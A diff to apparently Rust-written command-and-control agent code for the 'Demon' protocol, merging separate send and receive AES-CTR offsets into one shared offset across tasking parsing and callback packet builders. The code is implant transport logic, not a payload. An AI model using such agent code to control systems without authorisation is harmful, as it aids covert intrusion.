@@ -59,13 +59,13 @@ pub struct AgentMetadata {
     pub working_hours: i32,
 }
 
-/// Decrypted task stream plus the next receive CTR offset.
+/// Decrypted task stream plus the next shared CTR offset.
 #[derive(Debug, Clone)]
 pub struct TaskingResponse {
     /// Parsed task packages.
     pub packages: Vec<DemonPackage>,
-    /// Receive CTR offset after consuming the response body.
-    pub next_recv_ctr_offset: u64,
+    /// Shared CTR offset after consuming the response body.
+    pub next_ctr_offset: u64,
 }
 
 /// Build a `DEMON_INIT` packet matching the Demon transport framing.
@@ -120,11 +120,11 @@ pub fn parse_init_ack(
 pub fn parse_tasking_response(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
-    recv_ctr_offset: u64,
+    ctr_offset: u64,
     response_body: &[u8],
 ) -> Result<TaskingResponse, PhantomError> {
     if response_body.is_empty() {
-        return Ok(TaskingResponse { packages: Vec::new(), next_recv_ctr_offset: recv_ctr_offset });
+        return Ok(TaskingResponse { packages: Vec::new(), next_ctr_offset: ctr_offset });
     }
 
     let encrypted_payload = match DemonEnvelope::from_bytes(response_body) {
@@ -138,12 +138,12 @@ pub fn parse_tasking_response(
     };
 
     let decrypted =
-        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &encrypted_payload)?;
+        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, ctr_offset, &encrypted_payload)?;
     let message = DemonMessage::from_bytes(&decrypted)?;
 
     Ok(TaskingResponse {
         packages: message.packages,
-        next_recv_ctr_offset: recv_ctr_offset + ctr_blocks_for_len(encrypted_payload.len()),
+        next_ctr_offset: ctr_offset + ctr_blocks_for_len(encrypted_payload.len()),
     })
 }
 
@@ -152,7 +152,7 @@ pub fn parse_tasking_response(
 pub fn build_output_packet(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
-    send_ctr_offset: u64,
+    ctr_offset: u64,
     request_id: u32,
     text: &str,
 ) -> Result<Vec<u8>, PhantomError> {
@@ -160,7 +160,7 @@ pub fn build_output_packet(
     build_callback_packet(
         agent_id,
         crypto,
-        send_ctr_offset,
+        ctr_offset,
         u32::from(DemonCommand::CommandOutput),
         request_id,
         &payload,
@@ -172,7 +172,7 @@ pub fn build_output_packet(
 pub fn build_error_packet(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
-    send_ctr_offset: u64,
+    ctr_offset: u64,
     request_id: u32,
     text: &str,
 ) -> Result<Vec<u8>, PhantomError> {
@@ -182,7 +182,7 @@ pub fn build_error_packet(
     build_callback_packet(
         agent_id,
         crypto,
-        send_ctr_offset,
+        ctr_offset,
         u32::from(DemonCommand::CommandError),
         request_id,
         &payload,
@@ -194,14 +194,14 @@ pub fn build_error_packet(
 pub fn build_exit_packet(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
-    send_ctr_offset: u64,
+    ctr_offset: u64,
     request_id: u32,
     exit_method: u32,
 ) -> Result<Vec<u8>, PhantomError> {
     build_callback_packet(
         agent_id,
         crypto,
-        send_ctr_offset,
+        ctr_offset,
         u32::from(DemonCommand::CommandExit),
         request_id,
         &exit_method.to_be_bytes(),
@@ -220,7 +220,7 @@ pub fn callback_ctr_blocks(callback_payload_len: usize) -> u64 {
 pub(crate) fn build_callback_packet(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
-    send_ctr_offset: u64,
+    ctr_offset: u64,
     command_id: u32,
     request_id: u32,
     callback_payload: &[u8],
@@ -233,8 +233,7 @@ pub(crate) fn build_callback_packet(
     plaintext.extend_from_slice(&payload_len.to_be_bytes());
     plaintext.extend_from_slice(callback_payload);
 
-    let encrypted =
-        encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, send_ctr_offset, &plaintext)?;
+    let encrypted = encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, ctr_offset, &plaintext)?;
 
     let mut body = Vec::with_capacity(8 + encrypted.len());
     body.extend_from_slice(&command_id.to_be_bytes());
@@ -394,7 +393,7 @@ mod tests {
 
         let response = parse_tasking_response(11, &crypto, 0, &encrypted).expect("response");
         assert_eq!(response.packages.len(), 1);
-        assert_eq!(response.next_recv_ctr_offset, callback_ctr_blocks(0));
+        assert_eq!(response.next_ctr_offset, callback_ctr_blocks(0));
     }
 
     #[test]
